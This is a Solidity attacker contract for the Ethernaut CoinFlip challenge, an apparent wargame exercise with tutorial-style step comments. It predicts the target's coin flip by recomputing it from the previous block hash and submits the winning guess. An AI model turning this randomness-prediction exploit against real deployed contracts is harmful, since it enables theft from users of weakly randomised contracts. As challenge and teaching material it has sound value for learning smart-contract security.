// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//what the target's function looks like

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}



contract CoinFlipAttacker {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip targetContract;
    constructor(address ethernautTargetAddress) {
        targetContract = ICoinFlip(ethernautTargetAddress);
    }

    // 2. Take the Ethernaut target address as a parameter here
    function solveCoinFlip() public {
        
        // 3. Cast the raw address parameter into the interface type
        
        
        // 4. (Your secret logic to calculate the correct guess goes here...)
 
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool myCalculatedGuess = coinFlip == 1 ? true : false;
        // 5. Call the function directly on the Ethernaut instance!
        targetContract.flip(myCalculatedGuess);
    }
}
